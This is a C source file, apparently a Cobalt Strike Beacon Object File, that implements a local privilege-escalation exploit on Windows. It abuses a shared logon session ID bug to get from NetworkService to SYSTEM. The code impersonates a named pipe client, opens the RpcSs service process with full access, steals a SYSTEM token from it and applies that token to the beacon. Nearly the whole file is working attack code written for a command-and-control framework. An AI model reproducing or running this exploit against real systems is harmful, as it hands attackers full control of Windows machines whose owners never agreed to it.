/*!
 *
 * Network Service Exploit: Abuses the shared logon
 * session ID bug documented by James Forshaw that
 * permits a NetworkService account to acquire a
 * session ID matching RpcSS service, allowing it to
 * open the process with ALL_ACCESS handle.
 *
 * Using this access, the attacker may be able to
 * enumerate any active handles open within the 
 * process, and steal any SYSTEM tokens available to
 * it.
 *
 * For the bug to work properly, the attacker must
 * create a named pipe server handle and access it
 * from the local NPFS redirection using localhost 
 * as the server name.
 *
!*/
#include "common.h"

/**
 *
 * @ brief : Function entrypoint called by the binline-execute
 * mechanism available in Cobalt Strike 4.1. The function 
 * passes in any incoming arguments, and length of the arguments
 * so that they may be interpreted by beacons internal API.
 *
 * @ arg PCHAR Buffer : Pointer to the incoming argument buffer.
 * 
 * @ arg ULONG Length : Length of the incoming argument buffer.
 *
 * @ ret : Does not return anything.
 *
**/
void NetworkServiceElevate( IN PCHAR Buffer, IN ULONG Length ) {

	ULONG  ServicePID = 0;
	HANDLE ServicePtr = NULL;
	HANDLE ServiceTok = NULL;
	HANDLE ServerPipe = NULL;
	HANDLE ClientPipe = NULL;
	LPCSTR ClientpStr = NULL;
	LPCSTR ServerpStr = NULL;
	BEACON BeaconArgs = { 0 };

	if( BeaconIsAdmin() ) {
		BeaconPrintf( CALLBACK_ERROR, "Beacon Is Already Elevated" );
	};

	BeaconDataParse(&BeaconArgs, Buffer, Length);
	ServerpStr = BeaconDataExtract(&BeaconArgs, NULL);
	ClientpStr = BeaconDataExtract(&BeaconArgs, NULL);

	ServerPipe = NamedPipeOpen(ServerpStr);
	if ( ServerPipe != INVALID_HANDLE_VALUE ) 
	{
		ClientPipe = NamedPipeFile(ClientpStr);

		if ( NamedPipeWait(ServerPipe) ) 
		{
			if ( ADVAPI32$ImpersonateNamedPipeClient(ServerPipe) ) 
			{
				if ( (ServicePID = GetServiceProcessId("RpcSs")) != 0 ) 
				{
					ServicePtr = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, ServicePID);
					if ( ServicePtr != NULL ) 
					{
						if ( !(ServiceTok = TokenGetSystemTokenFromProcess(ServicePtr)) ) 
						{
							_ERROR("TokenGetSystemTokenFromProcess"); 
						};
					} else { _ERROR("OpenProcess"); };
				} else { _ERROR("GetServiceProcessId"); };

				BeaconRevertToken();
			} else { _ERROR("ImpersonateNamedPipeClient"); };

		} else { _ERROR("NamedPipeFile"); };

		NamedPipeFree(ServerPipe);
	} else { _ERROR("NamedPipeOpen"); };

	if ( ServiceTok != NULL ) {
		if ( ! BeaconUseToken( ServiceTok ) ) {
			_ERROR("BeaconUseToken");
		};
		KERNEL32$CloseHandle( ServiceTok );
	};

	if ( ServicePtr != NULL )
		KERNEL32$CloseHandle( ServicePtr );

	if ( ClientPipe != NULL || ClientPipe != INVALID_HANDLE_VALUE )
		KERNEL32$CloseHandle( ClientPipe );
};
